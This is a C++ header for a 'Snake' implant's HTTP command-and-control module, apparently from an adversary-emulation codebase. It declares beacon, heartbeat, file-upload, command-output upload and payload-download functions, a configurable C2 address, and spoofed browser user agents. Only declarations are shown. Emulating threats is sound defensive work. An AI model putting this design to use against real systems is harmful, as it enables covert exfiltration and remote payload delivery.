/*
 * Handle C2 communications over HTTP
 */

#ifndef SNAKE_USERLAND_COMMS_HTTP_H_
#define SNAKE_USERLAND_COMMS_HTTP_H_

#include <windows.h>
#include <WinInet.h>
#include <errhandlingapi.h>
#include <iostream>
#include <vector>
#include "api_wrappers.h"
#include "instruction.h"
#include "logging.h"
#include "file_handler.h"

#define RESP_BUFFER_SIZE 4096
#define MAX_FILE_UPLOAD_SIZE 100*1024*1024

#define QUOTE_C2_ADDRESS(X) L ## #X
#define EXPAND_AND_QUOTE_C2_ADDR(X) QUOTE_C2_ADDRESS(X)
#ifndef C2_ADDRESS
#define DEFAULT_C2_ADDRESS L"DEFAULT_C2_ADDRESS"
#else
#define DEFAULT_C2_ADDRESS EXPAND_AND_QUOTE_C2_ADDR(C2_ADDRESS)
#endif

#ifndef C2_PORT
#define DEFAULT_C2_PORT 80
#else
#define DEFAULT_C2_PORT (C2_PORT)
#endif

#define DEFAULT_USER_AGENT L"Mozilla/5.0 (compatible; MSIE 6.0)"
#define CHROME_WIN10_USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
#define FIREFOX_WIN10_USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
#define IE_WIN10_USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
#define EDGE_WIN10_USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/106.0.1370.52"
#define HEARTBEAT_PATH L"/PUB/home.html"
#define BASE_BEACON_PATH L"/PUB/"
#define BASE_OUTPUT_UPLOAD_PATH L"/IMAGES/3/"
#define BASE_PAYLOAD_DOWNLOAD_PATH L"/IMAGES/3/"
#define C2_LOG_ID L"62810421015953103444"
#define DEFAULT_BEACON_SLEEP_MS 5000

namespace comms_http {

const std::string kHeartbeatAliveResp("1");
extern std::wstring user_agent;

DWORD PerformHeartbeat(
    ApiWrapperInterface* api_wrapper,
    LPCWSTR address,
    WORD port
);

DWORD PerformBeacon(
    ApiWrapperInterface* api_wrapper, 
    LPCWSTR address, 
    WORD port, 
    std::wstring implant_id,
    instruction::Instruction* received_instruction
);

DWORD UploadFile(
    ApiWrapperInterface* api_wrapper,
    LPCWSTR address, 
    WORD port, 
    LPCWSTR file_to_upload, 
    std::wstring instruction_id,
    BOOL encrypt
);

DWORD UploadCommandOutput(
    ApiWrapperInterface* api_wrapper, 
    LPCWSTR address, 
    WORD port,
    std::vector<char> command_output,
    std::wstring instr_id
);

void UploadLogs(
    ApiWrapperInterface* api_wrapper, 
    LPCWSTR address, 
    WORD port
);

DWORD UploadAndTruncateLogWithMutex(
    ApiWrapperInterface* api_wrapper,
    LPCWSTR address, 
    WORD port, 
    LPCWSTR file_to_upload, 
    std::wstring instruction_id,
    BOOL encrypt,
    HANDLE h_mutex
);

std::vector<char> DownloadPayloadBytes(
    ApiWrapperInterface* api_wrapper, 
    LPCWSTR address, 
    WORD port,
    std::wstring instruction_id,
    DWORD* error_code
);

void UpdateUserAgent(std::wstring new_agent_str);

} // namespace comms_http

#endif
